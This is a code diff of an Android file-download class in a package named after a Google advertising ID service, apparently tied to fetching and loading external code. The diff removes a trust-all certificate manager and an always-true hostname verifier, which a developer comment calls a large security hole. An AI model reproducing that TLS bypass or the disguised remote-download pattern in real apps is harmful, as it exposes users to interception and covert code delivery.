@@ -7,6 +7,7 @@ import android.util.Log;
 
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
+import com.advertising_id_service.appclick.googleadvertisingidservice.HttpsConnection.HttpsConnectionServicer;
 import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.RestServicer;
 
@@ -19,9 +20,16 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.net.Authenticator;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.security.KeyManagementException;
 import java.security.KeyStore;
+import java.security.KeyStoreException;
+import java.security.NoSuchAlgorithmException;
+import java.security.UnrecoverableKeyException;
+import java.security.cert.CertificateException;
+import java.util.Properties;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipInputStream;
 
@@ -53,67 +61,22 @@ public class FilesLoader {
         return buf.toString();
     }
 
-    TrustManager[] trustAllCerts = new TrustManager[]{
-            new X509TrustManager() {
-                public java.security.cert.X509Certificate[] getAcceptedIssuers(){return null;}
-                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType){}
-                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType){}
-            }
-    };
-
-    private byte[] toByte(String hexString) {
-        int len = hexString.length()/2;
-        byte[] result = new byte[len];
-        for (int i = 0; i < len; i++)
-            result[i] = Integer.valueOf(hexString.substring(2*i, 2*i+2), 16).byteValue();
-        return result;
-    }
-
     public String downloadJson(String query) {
         int count;
 
         HttpsURLConnection connection = null;
         String res = "";
         try {
-            URL url = new URL(query);
-            String pass = new com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters().getPassToCert();
-            KeyStore clientStore = KeyStore.getInstance("PKCS12");
-            String cert = new com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters().getCert();
-            InputStream is = new ByteArrayInputStream(toByte(cert));
-
-            clientStore.load(is, pass.toCharArray());
-            KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
-            kmf.init(clientStore, pass.toCharArray());
-            KeyManager[] kms = kmf.getKeyManagers();
-
-
-
-            // TODO: Сделать по людски! Это решение - огромная дыра в безопасности:
-            //       Этот метод надо бы перенести в NDK
-            // см. https://developer.android.com/training/articles/security-ssl.html#CommonHostnameProbs
-            //     https://stackoverflow.com/questions/6659360/how-to-solve-javax-net-ssl-sslhandshakeexception-error?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
-            //---------------------------------------------------------------------->
-            HostnameVerifier hostnameVerifier = new HostnameVerifier() {
-                @Override
-                public boolean verify(String hostname, SSLSession session) {
-                    return true;
-                }
-            };
-            SSLContext sc = SSLContext.getInstance("SSL");
-            sc.init(kms, trustAllCerts, new java.security.SecureRandom());
-            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
-
-            connection = (HttpsURLConnection) url.openConnection();
-            connection.setHostnameVerifier(hostnameVerifier);
-            //<----------------------------------------------------------------------
-
-            connection.connect();
-            long modified = connection.getLastModified();
-            System.out.println(query + " " + connection.getResponseCode());
-            int lengthOfFile = connection.getContentLength();
-            InputStream in = connection.getInputStream();
-            res = readInputStreamAsString(in);
-            in.close();
+            connection = new HttpsConnectionServicer().getHttpsConnection(new URL(query));
+            if (connection != null) {
+                connection.connect();
+                long modified = connection.getLastModified();
+                System.out.println(query + " " + connection.getResponseCode());
+                int lengthOfFile = connection.getContentLength();
+                InputStream in = connection.getInputStream();
+                res = readInputStreamAsString(in);
+                in.close();
+            }
             return res;
         } catch (Exception e) {
             System.out.println(query + " " + e.getMessage());
@@ -128,12 +91,12 @@ public class FilesLoader {
         int count;
 
         OutputStream output;
-        HttpURLConnection connection = null;
+        HttpsURLConnection connection = null;
         try {
             URL url = new URL(query);
-            connection = (HttpURLConnection) url.openConnection();
-            connection.connect();
 
+            connection = new HttpsConnectionServicer().getHttpsConnection(url);
+            connection.connect();
             long modified = connection.getLastModified();
 
             System.out.println(query + " " + connection.getResponseCode());
@@ -141,7 +104,6 @@ public class FilesLoader {
             // progress bar
 
             int lengthOfFile = connection.getContentLength();
-
             //LogKES.debug(query + " " + lenghtOfFile);
 
             byte[] buffer = new byte[1024];
@@ -151,19 +113,16 @@ public class FilesLoader {
             // Output stream
             output = new FileOutputStream(dest);
 
-
             while ((count = input.read(buffer)) != -1) {
                 output.write(buffer, 0, count);
                 output.flush();
             }
-
             // flushing output
             output.flush();
 
             // closing streams
             output.close();
             input.close();
-
             dest.setLastModified(modified);
 
             if (dest.length() != lengthOfFile) {
@@ -174,7 +133,7 @@ public class FilesLoader {
                 return 0;
             }
         } catch (Exception e) {
-            System.out.println(query + " " + e.getMessage());
+            System.out.println(query + " error code: " + e.getMessage());
             return -1;
         } finally {
             if (connection != null) connection.disconnect();
@@ -255,9 +214,10 @@ public class FilesLoader {
         Boolean isFileDownloaded = true;
         Logger.log("Грузим файл из:" + url);
         String full_url = RestServicer.getUrlToDownloadFile(cnt, url, comment, downloadID);
-Log.e("!!!-->", "full_url = " + full_url);
+Logger.log( "full_url = " + full_url);
 //   TODO:   RERPLACE!!!! ---> ЗАМЕНИТЬ!!! downloadFile(cnt, full_url, path_to_zip);
-        downloadFile(cnt, url, path_to_zip); //<<<------------ на full_url
+//        downloadFile(cnt, url, path_to_zip); //<<<------------ на full_url
+        downloadFile(cnt, full_url, path_to_zip);
         if (isNeedUnzip) {
             isFileDownloaded = unpackZip(path_to_unzip, unzip_name);
         }
